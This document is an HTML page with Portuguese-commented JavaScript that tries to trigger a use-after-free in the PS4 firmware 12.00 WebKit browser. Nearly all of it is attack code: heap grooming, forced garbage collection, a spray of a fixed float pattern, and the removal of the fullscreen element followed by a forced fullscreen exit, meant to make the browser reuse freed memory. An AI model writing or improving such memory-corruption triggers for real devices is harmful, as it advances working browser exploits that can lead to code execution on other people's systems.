<!DOCTYPE html>
<html>
<head>
<meta charset="UTF-8">
<title>PS4 UAF - Gatilho Cirúrgico</title>
</head>
<body style="background-color: #222; color: #fff;">

<h2>PS4 12.00 - UAF Confirmation (Teste Cirúrgico do Fullscreen)</h2>

<button onclick="runTest()" style="padding: 10px; font-size: 16px;">Executar Teste: Destruição do Alvo</button>

<div id="log"></div>

<script>
const PATTERN = 2.121995791e-314;

function runTest() {
    const log = document.getElementById("log");
    log.innerHTML = "<p>Running... Press OPTIONS</p>";

    let controllers = [];

    // Passo 1: Alocação (Heap Grooming)
    for(let i = 0; i < 5000; i++) {
        let arr = new Float64Array(8);
        arr[0] = i;
        controllers.push(arr);
    }

    // PASSO NOVO: Criamos o alvo do Fullscreen em vez de usar o documentElement
    let fsTarget = document.createElement("div");
    fsTarget.innerHTML = "<h1 style='color: white; margin-top: 20%; text-align: center;'>Tela Cheia Ativa<br>Pressione OPTIONS agora</h1>";
    fsTarget.style.backgroundColor = "black";
    fsTarget.style.width = "100%";
    fsTarget.style.height = "100%";
    fsTarget.style.position = "absolute";
    fsTarget.style.top = "0";
    fsTarget.style.left = "0";
    document.body.appendChild(fsTarget);

    // Entra em Fullscreen usando o nosso alvo específico
    if (fsTarget.webkitRequestFullscreen) {
        fsTarget.webkitRequestFullscreen();
    } else {
        document.documentElement.webkitRequestFullscreen?.();
    }

    window.onblur = function() {
        // FORÇA GC
        controllers = null;

        for (let i = 0; i < 20000; i++) {
            new ArrayBuffer(0x10000);
        }

        // Spray mantido (Essencial para sobrescrever o objeto C++ deletado)
        let spray = [];
        for(let i = 0; i < 8000; i++) {
            let p = new Float64Array(10);
            p.fill(PATTERN);
            spray.push(p);
        }

        // Gatilho crítico Cirúrgico
        setTimeout(() => {
            try {
                // 1. Destruímos apenas o elemento hospedeiro da tela cheia!
                // Isso cria o "dangling pointer" no Fullscreen Manager do WebCore.
                fsTarget.remove(); 
                
                // 2. Forçamos o WebKit a tentar resolver a saída da tela cheia agora que o elemento sumiu.
                // Aqui é onde o WebKit deve tropeçar no seu PATTERN e crashar.
                if (document.webkitIsFullScreen || document.fullscreenElement) {
                    document.webkitExitFullscreen?.() || document.webkitCancelFullScreen?.();
                }
            } catch(e) {
                console.log("[ERRO NO GATILHO]", e);
            }

            // O fallback caso sobreviva (não deve chegar aqui se o UAF funcionar)
            setTimeout(() => location.reload(), 500);
        }, 3000);
    };
}
</script>

</body>
</html>
